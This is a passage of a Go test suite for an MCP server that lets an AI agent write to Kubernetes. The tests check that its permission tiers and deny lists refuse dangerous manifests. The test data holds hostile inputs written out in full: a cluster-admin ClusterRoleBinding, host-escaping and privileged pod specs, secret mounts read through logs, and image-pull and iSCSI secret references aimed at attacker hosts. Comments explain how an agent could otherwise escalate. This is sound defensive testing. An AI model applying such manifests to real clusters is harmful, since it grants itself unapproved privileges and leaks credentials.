package cli

import (
	"context"
	"fmt"
	"slices"
	"strings"
	"testing"
	"time"

	sdk "github.com/modelcontextprotocol/go-sdk/mcp"
	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/errors"
	apiresource "k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"

	mcpsrv "github.com/ctrliq/stratum/internal/mcp"
	"github.com/ctrliq/stratum/internal/mcp/kube"
	"github.com/ctrliq/stratum/internal/mcp/kube/kubetest"
)

// Protocol-boundary tests for the generic write toolset.

// newWriteSession is newK8sSession with the tiers the operator enabled.
func newWriteSession(t *testing.T, allowWrite, allowDestructive bool) *k8sSession {
	t.Helper()
	cfg := kubetest.Start(t)
	kubetest.IsolateHome(t)
	path := kubetest.Kubeconfig(t, cfg, "alpha")

	conn := kube.NewConnector(kube.Options{Kubeconfig: path})
	srv := mcpsrv.NewServer(mcpsrv.Options{Version: "v0-test"})
	registerAll(newRegistrar(srv, allowWrite, allowDestructive),
		rootConfig{displayVersion: "v0-test"}, conn, testConnector())

	serverT, clientT := sdk.NewInMemoryTransports()
	go func() { _ = srv.Run(t.Context(), serverT) }()

	cs, err := sdk.NewClient(&sdk.Implementation{Name: "test", Version: "0"}, nil).
		Connect(t.Context(), clientT, nil)
	if err != nil {
		t.Fatalf("connect: %v", err)
	}
	t.Cleanup(func() { _ = cs.Close() })

	s := &k8sSession{cs: cs, typed: typedFor(t, cfg)}
	s.namespace = s.createNamespace(t)
	return s
}

// The security assertion, and the reason this tier exists.
func TestWriteToolsAreAbsentWithoutTheFlag(t *testing.T) {
	s := newWriteSession(t, false, false)

	advertised := map[string]bool{}
	res, err := s.cs.ListTools(t.Context(), nil)
	if err != nil {
		t.Fatalf("tools/list: %v", err)
	}
	for _, tool := range res.Tools {
		advertised[tool.Name] = true
	}

	for _, name := range engineWriteTools {
		if advertised[name] {
			t.Errorf("%s is advertised without --allow-write", name)
		}
		// Absence is the control; that the call also fails only confirms
		// nothing answers behind it.
		if _, err := s.cs.CallTool(t.Context(), &sdk.CallToolParams{Name: name}); err == nil {
			t.Errorf("calling unregistered %s succeeded", name)
		}
	}
}

func TestWriteToolsAppearWithTheFlag(t *testing.T) {
	s := newWriteSession(t, true, false)

	res, err := s.cs.ListTools(t.Context(), nil)
	if err != nil {
		t.Fatalf("tools/list: %v", err)
	}
	byName := map[string]*sdk.Tool{}
	for _, tool := range res.Tools {
		byName[tool.Name] = tool
	}

	for _, name := range engineWriteTools {
		tool, ok := byName[name]
		if !ok {
			t.Errorf("%s missing with --allow-write", name)
			continue
		}
		if tool.Annotations == nil {
			t.Errorf("%s has no annotations", name)
			continue
		}
		if tool.Annotations.ReadOnlyHint {
			t.Errorf("%s is annotated read-only but it writes", name)
		}

		// delete and apply are destructive; scale is not.
		wantDestructive := name == "resource_delete" || name == "resource_apply"
		got := tool.Annotations.DestructiveHint != nil && *tool.Annotations.DestructiveHint
		if got != wantDestructive {
			t.Errorf("%s destructive hint = %v, want %v", name, got, wantDestructive)
		}
	}
}

func TestResourceApplyRoundTrip(t *testing.T) {
	s := newWriteSession(t, true, false)

	manifest := map[string]any{
		"apiVersion": "v1",
		"kind":       "ConfigMap",
		"metadata":   map[string]any{"name": "applied", "namespace": s.namespace},
		"data":       map[string]any{"key": "first"},
	}

	t.Run("dry run changes nothing", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": manifest, "dry_run": true}, &out)
		if !out.DryRun {
			t.Error("dry_run not reported back")
		}
		if out.Note == "" {
			t.Error("a dry run came back with no note saying nothing was persisted")
		}
		if _, err := s.typed.CoreV1().ConfigMaps(s.namespace).Get(t.Context(), "applied", metav1.GetOptions{}); !errors.IsNotFound(err) {
			t.Fatalf("dry run created the object: err = %v", err)
		}
	})

	t.Run("create", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": manifest}, &out)
		if out.Name != "applied" || out.Namespace != s.namespace {
			t.Errorf("applied %s/%s", out.Namespace, out.Name)
		}
		got, err := s.typed.CoreV1().ConfigMaps(s.namespace).Get(t.Context(), "applied", metav1.GetOptions{})
		if err != nil {
			t.Fatalf("get after apply: %v", err)
		}
		if got.Data["key"] != "first" {
			t.Errorf("data = %v", got.Data)
		}
		// The fixed field manager is what makes the server's changes
		// attributable, so it is asserted rather than assumed.
		var managers []string
		for _, e := range got.ManagedFields {
			managers = append(managers, e.Manager)
		}
		if !slices.Contains(managers, mcpsrv.FieldManager) {
			t.Errorf("field managers = %v, want one named %q", managers, mcpsrv.FieldManager)
		}
	})

	t.Run("update is an apply of the same name", func(t *testing.T) {
		manifest["data"] = map[string]any{"key": "second"}
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": manifest}, &out)

		got, err := s.typed.CoreV1().ConfigMaps(s.namespace).Get(t.Context(), "applied", metav1.GetOptions{})
		if err != nil {
			t.Fatalf("get: %v", err)
		}
		if got.Data["key"] != "second" {
			t.Errorf("data = %v, want the applied update", got.Data)
		}
	})

	t.Run("a manifest without a name is rejected", func(t *testing.T) {
		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "ConfigMap",
			"metadata": map[string]any{"generateName": "nope-"},
		}})
		if !strings.Contains(msg, "metadata.name") {
			t.Errorf("error %q does not say what is missing", msg)
		}
	})

	t.Run("a namespace argument that contradicts the manifest is refused", func(t *testing.T) {
		// Not resolved silently in either direction.
		other := s.createNamespace(t)
		msg := s.callExpectingError(t, "resource_apply", map[string]any{
			"manifest": map[string]any{
				"apiVersion": "v1", "kind": "ConfigMap",
				"metadata": map[string]any{"name": "elsewhere", "namespace": s.namespace},
			},
			"namespace": other,
		})
		if !strings.Contains(msg, "disagree") {
			t.Errorf("error %q does not say the two namespaces disagree", msg)
		}
		for _, ns := range []string{s.namespace, other} {
			if _, err := s.typed.CoreV1().ConfigMaps(ns).Get(t.Context(), "elsewhere", metav1.GetOptions{}); !errors.IsNotFound(err) {
				t.Errorf("the object was applied to %s anyway: err = %v", ns, err)
			}
		}
	})

	t.Run("a namespace argument alone still places the object", func(t *testing.T) {
		// The override is only refused when the manifest disagrees.
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{
			"manifest": map[string]any{
				"apiVersion": "v1", "kind": "ConfigMap",
				"metadata": map[string]any{"name": "placed"},
			},
			"namespace": s.namespace,
		}, &out)
		if out.Namespace != s.namespace {
			t.Errorf("applied into %q, want %q", out.Namespace, s.namespace)
		}
	})

	t.Run("an unknown kind names itself", func(t *testing.T) {
		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "example.com/v1", "kind": "Wibble",
			"metadata": map[string]any{"name": "x", "namespace": s.namespace},
		}})
		if !strings.Contains(msg, "Wibble") {
			t.Errorf("error %q does not name the kind", msg)
		}
	})
}

func TestResourceScaleRoundTrip(t *testing.T) {
	s := newWriteSession(t, true, false)

	replicas := int32(3)
	_, err := s.typed.AppsV1().Deployments(s.namespace).Create(t.Context(), &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{Name: "scaler", Namespace: s.namespace},
		Spec: appsv1.DeploymentSpec{
			Replicas: &replicas,
			Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"app": "scaler"}},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"app": "scaler"}},
				Spec:       corev1.PodSpec{Containers: []corev1.Container{{Name: "c", Image: "busybox"}}},
			},
		},
	}, metav1.CreateOptions{})
	if err != nil {
		t.Fatalf("create deployment: %v", err)
	}

	var out mcpsrv.ResourceScaleOut
	s.call(t, "resource_scale", map[string]any{
		"resource": "deploy", "name": "scaler", "namespace": s.namespace, "replicas": 1,
	}, &out)
	if out.Replicas != 1 {
		t.Errorf("reported replicas = %d, want 1", out.Replicas)
	}

	got, err := s.typed.AppsV1().Deployments(s.namespace).Get(t.Context(), "scaler", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("get: %v", err)
	}
	if got.Spec.Replicas == nil || *got.Spec.Replicas != 1 {
		t.Errorf("deployment replicas = %v, want 1", got.Spec.Replicas)
	}

	t.Run("scaling to zero says so", func(t *testing.T) {
		var zero mcpsrv.ResourceScaleOut
		s.call(t, "resource_scale", map[string]any{
			"resource": "deploy", "name": "scaler", "namespace": s.namespace, "replicas": 0,
		}, &zero)
		if zero.Note == "" {
			t.Error("scaling to zero came back with no note")
		}
	})

	t.Run("negative replicas are rejected", func(t *testing.T) {
		msg := s.callExpectingError(t, "resource_scale", map[string]any{
			"resource": "deploy", "name": "scaler", "namespace": s.namespace, "replicas": -1,
		})
		// "some error occurred" is not the assertion.
		if !strings.Contains(msg, "negative") {
			t.Errorf("error %q is the API server's, not the handler's pre-flight check", msg)
		}
	})

	// A resource with no /scale subresource fails on a path the caller never
	// typed, so the message has to explain itself.
	t.Run("an unscalable resource explains why", func(t *testing.T) {
		// The ConfigMap is created first, so the 404 can only be the missing
		// subresource.
		if _, err := s.typed.CoreV1().ConfigMaps(s.namespace).Create(t.Context(), &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: "unscalable", Namespace: s.namespace},
		}, metav1.CreateOptions{}); err != nil {
			t.Fatalf("create configmap: %v", err)
		}
		msg := s.callExpectingError(t, "resource_scale", map[string]any{
			"resource": "configmaps", "name": "unscalable", "namespace": s.namespace, "replicas": 1,
		})
		if !strings.Contains(msg, "may not support scaling") {
			t.Errorf("error %q does not explain that the resource has no /scale", msg)
		}
	})

	// The other 404 on the same path.
	t.Run("a missing object is not reported as an unscalable resource", func(t *testing.T) {
		msg := s.callExpectingError(t, "resource_scale", map[string]any{
			"resource": "deploy", "name": "no-such-deployment", "namespace": s.namespace, "replicas": 1,
		})
		if strings.Contains(msg, "may not support scaling") {
			t.Errorf("error %q blames the resource kind when the object is what is missing", msg)
		}
		if !strings.Contains(msg, "no-such-deployment") {
			t.Errorf("error %q does not name the object that was not found", msg)
		}
	})
}

func TestResourceDeleteRoundTrip(t *testing.T) {
	s := newWriteSession(t, true, false)

	mk := func(name string) {
		t.Helper()
		_, err := s.typed.CoreV1().ConfigMaps(s.namespace).Create(t.Context(), &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: s.namespace},
		}, metav1.CreateOptions{})
		if err != nil {
			t.Fatalf("create %s: %v", name, err)
		}
	}

	t.Run("dry run deletes nothing", func(t *testing.T) {
		mk("keep-me")
		var out mcpsrv.ResourceDeleteOut
		s.call(t, "resource_delete", map[string]any{
			"resource": "configmaps", "name": "keep-me", "namespace": s.namespace, "dry_run": true,
		}, &out)
		if !out.DryRun || out.Note == "" {
			t.Errorf("dry run not reported: %+v", out)
		}
		if _, err := s.typed.CoreV1().ConfigMaps(s.namespace).Get(t.Context(), "keep-me", metav1.GetOptions{}); err != nil {
			t.Fatalf("dry run deleted the object: %v", err)
		}
	})

	t.Run("delete", func(t *testing.T) {
		mk("delete-me")
		var out mcpsrv.ResourceDeleteOut
		s.call(t, "resource_delete", map[string]any{
			"resource": "configmaps", "name": "delete-me", "namespace": s.namespace,
		}, &out)
		if out.Name != "delete-me" {
			t.Errorf("out = %+v", out)
		}
		if _, err := s.typed.CoreV1().ConfigMaps(s.namespace).Get(t.Context(), "delete-me", metav1.GetOptions{}); !errors.IsNotFound(err) {
			t.Fatalf("object survived delete: err = %v", err)
		}
	})

	// No bulk delete exists, on purpose: a missing name must fail rather
	// than mean "all of them".
	t.Run("a missing name is rejected, not treated as a wildcard", func(t *testing.T) {
		mk("survivor")
		msg := s.callExpectingError(t, "resource_delete", map[string]any{
			"resource": "configmaps", "namespace": s.namespace,
		})
		if !strings.Contains(msg, "name") {
			t.Errorf("error %q does not mention the missing name", msg)
		}
		if _, err := s.typed.CoreV1().ConfigMaps(s.namespace).Get(t.Context(), "survivor", metav1.GetOptions{}); err != nil {
			t.Fatalf("a nameless delete removed something: %v", err)
		}
	})
}

// The escalation guard. Without it --allow-write is transitively
// --allow-anything, because writing a ClusterRoleBinding grants whatever
// the agent likes — which would make the whole tier system decorative.
func TestIdentityAndAdmissionWritesAreRefused(t *testing.T) {
	s := newWriteSession(t, true, true) // both flags: the deny list still holds

	for _, tc := range []struct {
		name     string
		manifest map[string]any
	}{
		{"secret", map[string]any{
			"apiVersion": "v1", "kind": "Secret",
			"metadata": map[string]any{"name": "creds", "namespace": s.namespace},
		}},
		{"clusterrolebinding", map[string]any{
			"apiVersion": "rbac.authorization.k8s.io/v1", "kind": "ClusterRoleBinding",
			"metadata": map[string]any{"name": "escalate"},
			"roleRef": map[string]any{
				"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "cluster-admin",
			},
		}},
		{"serviceaccount", map[string]any{
			"apiVersion": "v1", "kind": "ServiceAccount",
			"metadata": map[string]any{"name": "sa", "namespace": s.namespace},
		}},
		{"validatingwebhookconfiguration", map[string]any{
			"apiVersion": "admissionregistration.k8s.io/v1", "kind": "ValidatingWebhookConfiguration",
			"metadata": map[string]any{"name": "hook"},
		}},
	} {
		t.Run("apply "+tc.name, func(t *testing.T) {
			msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": tc.manifest})
			if !strings.Contains(msg, "not writable") {
				t.Errorf("error %q does not say the resource is refused by policy", msg)
			}
		})
	}

	t.Run("delete is refused too, even with --allow-destructive", func(t *testing.T) {
		msg := s.callExpectingError(t, "resource_delete", map[string]any{
			"resource": "secrets", "name": "anything", "namespace": s.namespace,
		})
		if !strings.Contains(msg, "not writable") {
			t.Errorf("error %q does not say the resource is refused by policy", msg)
		}
	})

	// Worth a test of its own: the refusal must not read as "ask for a
	// bigger flag", because there is no flag that grants it.
	t.Run("the message does not suggest a flag would help", func(t *testing.T) {
		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Secret",
			"metadata": map[string]any{"name": "creds", "namespace": s.namespace},
		}})
		if !strings.Contains(msg, "fixed policy") {
			t.Errorf("error %q should say this is policy, not a permission", msg)
		}
	})
}

// Deleting a namespace cascades and deleting a PVC destroys data.
func TestUnrecoverableDeletesNeedTheDestructiveFlag(t *testing.T) {
	t.Run("refused with only --allow-write", func(t *testing.T) {
		s := newWriteSession(t, true, false)
		for _, resource := range []string{
			"namespaces", "persistentvolumeclaims", "nodes", "customresourcedefinitions",
		} {
			msg := s.callExpectingError(t, "resource_delete", map[string]any{
				"resource": resource, "name": "target", "namespace": s.namespace,
			})
			if !strings.Contains(msg, "--allow-destructive") {
				t.Errorf("deleting %s: error %q does not name the flag that would allow it", resource, msg)
			}
		}
	})

	t.Run("allowed with --allow-destructive", func(t *testing.T) {
		s := newWriteSession(t, true, true)
		target := s.namespace + "-doomed"
		_, err := s.typed.CoreV1().Namespaces().Create(t.Context(),
			&corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: target}}, metav1.CreateOptions{})
		if err != nil {
			t.Fatalf("create namespace: %v", err)
		}

		// envtest runs no namespace controller, so the delete is accepted and the
		// namespace stays Terminating forever.
		var out mcpsrv.ResourceDeleteOut
		s.call(t, "resource_delete", map[string]any{"resource": "namespaces", "name": target}, &out)
		if out.Name != target {
			t.Errorf("out = %+v", out)
		}
	})
}

// Creating or changing a namespace needs --allow-destructive: an apply can be
// as hard to undo as a delete.
func TestIrreversibleAppliesNeedTheDestructiveFlag(t *testing.T) {
	namespace := func(name string) map[string]any {
		return map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Namespace",
			"metadata": map[string]any{"name": name, "labels": map[string]any{"touched": "yes"}},
		}}
	}
	t.Run("refused with only --allow-write", func(t *testing.T) {
		s := newWriteSession(t, true, false)
		msg := s.callExpectingError(t, "resource_apply", namespace(s.namespace))
		if !strings.Contains(msg, "--allow-destructive") {
			t.Errorf("error %q does not name the flag that would allow it", msg)
		}
	})
	t.Run("allowed with --allow-destructive", func(t *testing.T) {
		s := newWriteSession(t, true, true)
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", namespace(s.namespace), &out)
		if out.Name != s.namespace {
			t.Errorf("out = %+v", out)
		}
	})
}

// A PodTemplate carries a pod spec at its top level, outside spec, and is
// checked like any other.
func TestPodTemplatePodSpecsAreChecked(t *testing.T) {
	s := newWriteSession(t, true, true)
	msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
		"apiVersion": "v1", "kind": "PodTemplate",
		"metadata": map[string]any{"name": "escape", "namespace": s.namespace},
		"template": map[string]any{"spec": map[string]any{
			"hostPID":    true,
			"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
		}},
	}})
	if !strings.Contains(msg, "hostPID") {
		t.Errorf("error %q does not name hostPID", msg)
	}
}

// The deny and destructive lists are pinned, so adding or removing one is a
// deliberate edit rather than a side effect.
func TestWritePolicyListsArePinned(t *testing.T) {
	wantDenied := []string{
		"apiservices.apiregistration.k8s.io",
		"certificatesigningrequests.certificates.k8s.io",
		"clusterrolebindings.rbac.authorization.k8s.io",
		"clusterroles.rbac.authorization.k8s.io",
		"helmchartconfigs.stratum.ciq.com",
		"helmcharts.stratum.ciq.com",
		"mutatingadmissionpolicies.admissionregistration.k8s.io",
		"mutatingadmissionpolicybindings.admissionregistration.k8s.io",
		"mutatingwebhookconfigurations.admissionregistration.k8s.io",
		"rolebindings.rbac.authorization.k8s.io",
		"roles.rbac.authorization.k8s.io",
		"secrets",
		"serviceaccounts",
		"validatingadmissionpolicies.admissionregistration.k8s.io",
		"validatingadmissionpolicybindings.admissionregistration.k8s.io",
		"validatingwebhookconfigurations.admissionregistration.k8s.io",
	}
	if got := mcpsrv.DeniedWriteResources(); !slices.Equal(got, wantDenied) {
		t.Errorf("denied writes =\n  %q\nwant\n  %q", got, wantDenied)
	}

	wantDestructive := []string{
		"customresourcedefinitions.apiextensions.k8s.io",
		"namespaces",
		"nodes",
		"persistentvolumeclaims",
		"persistentvolumes",
	}
	if got := mcpsrv.DestructiveDeleteResources(); !slices.Equal(got, wantDestructive) {
		t.Errorf("destructive deletes =\n  %q\nwant\n  %q", got, wantDestructive)
	}

	wantDestructiveMutations := []string{
		"customresourcedefinitions.apiextensions.k8s.io",
		"namespaces",
	}
	if got := mcpsrv.DestructiveMutationResources(); !slices.Equal(got, wantDestructiveMutations) {
		t.Errorf("destructive mutations =\n  %q\nwant\n  %q", got, wantDestructiveMutations)
	}
}

// TestHostEscapingPodSpecsAreRefused.
func TestHostEscapingPodSpecsAreRefused(t *testing.T) {
	s := newWriteSession(t, true, true)

	podSpec := func(extra map[string]any) map[string]any {
		spec := map[string]any{
			"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
		}
		for k, v := range extra {
			spec[k] = v
		}
		return spec
	}

	for _, tc := range []struct {
		name string
		spec map[string]any
		want string
	}{
		{"hostNetwork", podSpec(map[string]any{"hostNetwork": true}), "hostNetwork"},
		{"hostPID", podSpec(map[string]any{"hostPID": true}), "hostPID"},
		{"hostIPC", podSpec(map[string]any{"hostIPC": true}), "hostIPC"},
		{"hostPath volume", podSpec(map[string]any{
			"volumes": []any{map[string]any{
				"name": "root", "hostPath": map[string]any{"path": "/"},
			}},
		}), "hostPath"},
		{"privileged container", map[string]any{
			"containers": []any{map[string]any{
				"name": "c", "image": "busybox",
				"securityContext": map[string]any{"privileged": true},
			}},
		}, "privileged"},
		{"added capability", map[string]any{
			"containers": []any{map[string]any{
				"name": "c", "image": "busybox",
				"securityContext": map[string]any{
					"capabilities": map[string]any{"add": []any{"SYS_ADMIN"}},
				},
			}},
		}, "Linux capabilities"},
		{"unmasked procMount", map[string]any{
			"containers": []any{map[string]any{
				"name": "c", "image": "busybox",
				"securityContext": map[string]any{"procMount": "Unmasked"},
			}},
		}, "procMount"},
		{"privileged initContainer", map[string]any{
			"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
			"initContainers": []any{map[string]any{
				"name": "i", "image": "busybox",
				"securityContext": map[string]any{"privileged": true},
			}},
		}, "privileged"},
	} {
		t.Run("pod with "+tc.name, func(t *testing.T) {
			msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
				"apiVersion": "v1", "kind": "Pod",
				"metadata": map[string]any{"name": "escape", "namespace": s.namespace},
				"spec":     tc.spec,
			}})
			if !strings.Contains(msg, tc.want) {
				t.Errorf("error %q does not name %s", msg, tc.want)
			}
		})

		// The same spec one level down. A Deployment is the likelier
		// shape, and a guard that only reads the Pod case is no guard.
		t.Run("deployment with "+tc.name, func(t *testing.T) {
			msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
				"apiVersion": "apps/v1", "kind": "Deployment",
				"metadata": map[string]any{"name": "escape", "namespace": s.namespace},
				"spec": map[string]any{
					"selector": map[string]any{"matchLabels": map[string]any{"app": "x"}},
					"template": map[string]any{
						"metadata": map[string]any{"labels": map[string]any{"app": "x"}},
						"spec":     tc.spec,
					},
				},
			}})
			if !strings.Contains(msg, tc.want) {
				t.Errorf("error %q does not name %s", msg, tc.want)
			}
		})
	}

	t.Run("an ordinary pod spec is still applied", func(t *testing.T) {
		// The guard has to be narrow enough to leave the tool useful.
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Pod",
			"metadata": map[string]any{"name": "ordinary", "namespace": s.namespace},
			"spec":     podSpec(nil),
		}}, &out)
		if out.Name != "ordinary" {
			t.Errorf("out = %+v", out)
		}
	})

	t.Run("a dropped capability is not an added one", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Pod",
			"metadata": map[string]any{"name": "hardened", "namespace": s.namespace},
			"spec": map[string]any{"containers": []any{map[string]any{
				"name": "c", "image": "busybox",
				"securityContext": map[string]any{
					"capabilities": map[string]any{"drop": []any{"ALL"}},
					"procMount":    "Default",
				},
			}}},
		}}, &out)
		if out.Name != "hardened" {
			t.Errorf("out = %+v", out)
		}
	})
}

// TestSecretBearingPodSpecsAreRefused covers the disclosure route around
// the Secret read deny list: mount one, print it, read it via pod_logs.
func TestSecretBearingPodSpecsAreRefused(t *testing.T) {
	s := newWriteSession(t, true, true)

	for _, tc := range []struct {
		name string
		spec map[string]any
		want string
	}{
		{"secret volume", map[string]any{
			"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
			"volumes": []any{map[string]any{
				"name": "s", "secret": map[string]any{"secretName": "any"},
			}},
		}, "a secret volume"},
		{"projected secret", map[string]any{
			"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
			"volumes": []any{map[string]any{
				"name": "s", "projected": map[string]any{"sources": []any{
					map[string]any{"secret": map[string]any{"name": "any"}},
				}},
			}},
		}, "a projected secret source"},
		{"projected serviceAccountToken", map[string]any{
			"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
			"volumes": []any{map[string]any{
				"name": "s", "projected": map[string]any{"sources": []any{
					map[string]any{"serviceAccountToken": map[string]any{"path": "token"}},
				}},
			}},
		}, "a projected serviceAccountToken source"},
		{"secretKeyRef env", map[string]any{
			"containers": []any{map[string]any{
				"name": "c", "image": "busybox",
				"env": []any{map[string]any{
					"name": "V", "valueFrom": map[string]any{
						"secretKeyRef": map[string]any{"name": "any", "key": "k"},
					},
				}},
			}},
		}, "a secretKeyRef environment variable"},
		{"envFrom secretRef", map[string]any{
			"containers": []any{map[string]any{
				"name": "c", "image": "busybox",
				"envFrom": []any{map[string]any{
					"secretRef": map[string]any{"name": "any"},
				}},
			}},
		}, "an envFrom secretRef"},
		// The kubelet presents this Secret to whatever registry the image
		// names, so the credential leaves the cluster without any
		// container reading it.
		{"imagePullSecrets", map[string]any{
			"containers":       []any{map[string]any{"name": "c", "image": "registry.attacker.example/x"}},
			"imagePullSecrets": []any{map[string]any{"name": "regcred"}},
		}, "an imagePullSecrets reference"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
				"apiVersion": "v1", "kind": "Pod",
				"metadata": map[string]any{"name": "leak", "namespace": s.namespace},
				"spec":     tc.spec,
			}})
			if !strings.Contains(msg, tc.want) {
				t.Errorf("error %q does not name %q", msg, tc.want)
			}
			if !strings.Contains(msg, "pod_logs") {
				t.Errorf("error %q does not say why: the disclosure is through pod_logs", msg)
			}
		})
	}

	// A configMap through the same fields must still work.
	t.Run("a configMap by the same routes is still applied", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Pod",
			"metadata": map[string]any{"name": "configured", "namespace": s.namespace},
			"spec": map[string]any{
				"containers": []any{map[string]any{
					"name": "c", "image": "busybox",
					"envFrom": []any{map[string]any{
						"configMapRef": map[string]any{"name": "any"},
					}},
					"env": []any{map[string]any{
						"name": "V", "valueFrom": map[string]any{
							"configMapKeyRef": map[string]any{"name": "any", "key": "k"},
						},
					}},
				}},
				"volumes": []any{map[string]any{
					"name": "c", "projected": map[string]any{"sources": []any{
						map[string]any{"configMap": map[string]any{"name": "any"}},
					}},
				}},
			},
		}}, &out)
		if out.Name != "configured" {
			t.Errorf("out = %+v", out)
		}
	})
}

// A volume that names a Secret for the kubelet to deliver leaks it without
// any container reading it: the in-tree iSCSI plugin logs in to the portal
// the pod spec names with the Secret's CHAP keys. Every such reference is
// refused, the removed in-tree plugins included, and the refusal says the
// kubelet sends the values, not that a container could print them.
func TestVolumeSecretRefsAreRefused(t *testing.T) {
	s := newWriteSession(t, true, true)
	container := []any{map[string]any{"name": "c", "image": "busybox"}}
	ref := map[string]any{"name": "chap"}
	for _, tc := range []struct {
		name   string
		volume map[string]any
		want   string
	}{
		{"iscsi secretRef to an attacker portal", map[string]any{"iscsi": map[string]any{
			"targetPortal": "198.51.100.7:3260", "iqn": "iqn.2026-10.example.attacker:t", "lun": int64(0),
			"chapAuthSession": true, "secretRef": ref,
		}}, "a volume's iscsi.secretRef"},
		{"csi nodePublishSecretRef", map[string]any{"csi": map[string]any{
			"driver": "csi.example.com", "nodePublishSecretRef": ref,
		}}, "a volume's csi.nodePublishSecretRef"},
		{"flexVolume secretRef", map[string]any{"flexVolume": map[string]any{
			"driver": "example.com/flex", "secretRef": ref,
		}}, "a volume's flexVolume.secretRef"},
		{"rbd secretRef", map[string]any{"rbd": map[string]any{
			"monitors": []any{"198.51.100.7:6789"}, "image": "img", "secretRef": ref,
		}}, "a volume's rbd.secretRef"},
		{"cephfs secretRef", map[string]any{"cephfs": map[string]any{
			"monitors": []any{"198.51.100.7:6789"}, "secretRef": ref,
		}}, "a volume's cephfs.secretRef"},
		{"cinder secretRef", map[string]any{"cinder": map[string]any{
			"volumeID": "v", "secretRef": ref,
		}}, "a volume's cinder.secretRef"},
		{"scaleIO secretRef", map[string]any{"scaleIO": map[string]any{
			"gateway": "https://198.51.100.7", "system": "s", "secretRef": ref,
		}}, "a volume's scaleIO.secretRef"},
		{"storageos secretRef", map[string]any{"storageos": map[string]any{
			"volumeName": "v", "secretRef": ref,
		}}, "a volume's storageos.secretRef"},
		{"azureFile secretName", map[string]any{"azureFile": map[string]any{
			"secretName": "chap", "shareName": "s",
		}}, "a volume's azureFile.secretName"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tc.volume["name"] = "v"
			msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
				"apiVersion": "v1", "kind": "Pod",
				"metadata": map[string]any{"name": "leak", "namespace": s.namespace},
				"spec":     map[string]any{"containers": container, "volumes": []any{tc.volume}},
			}})
			if !strings.Contains(msg, tc.want) {
				t.Errorf("error %q does not name %q", msg, tc.want)
			}
			if !strings.Contains(msg, "the kubelet reads that Secret") {
				t.Errorf("error %q does not say why: the kubelet delivers the Secret", msg)
			}
		})
	}

	// The refusal is for the Secret, not the volume type.
	t.Run("an iscsi volume without a secretRef is still applied", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Pod",
			"metadata": map[string]any{"name": "iscsi-plain", "namespace": s.namespace},
			"spec": map[string]any{
				"containers": container,
				"volumes": []any{map[string]any{"name": "v", "iscsi": map[string]any{
					"targetPortal": "198.51.100.7:3260", "iqn": "iqn.2026-10.example.lab:t", "lun": int64(0),
				}}},
			},
		}}, &out)
		if out.Name != "iscsi-plain" {
			t.Errorf("out = %+v", out)
		}
	})
}

// The operator deletes whatever its kube-system inventory lists, and a
// node-client claim holds a node name, both with the operator's own
// cluster-admin identity. Writing either through this server would get around
// its tiers, so neither is writable even with both flags.
func TestEngineConfigMapsAreNotWritableAtAnyTier(t *testing.T) {
	for _, destructive := range []bool{false, true} {
		t.Run(fmt.Sprintf("allow-destructive=%t", destructive), func(t *testing.T) {
			testEngineConfigMapsRefused(t, newWriteSession(t, true, destructive))
		})
	}
}

func testEngineConfigMapsRefused(t *testing.T, s *k8sSession) {
	t.Helper()
	for _, name := range []string{"stratum-addon-inventory", "stratum-node-client-claim-0123abcd"} {
		t.Run("apply "+name, func(t *testing.T) {
			msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
				"apiVersion": "v1", "kind": "ConfigMap",
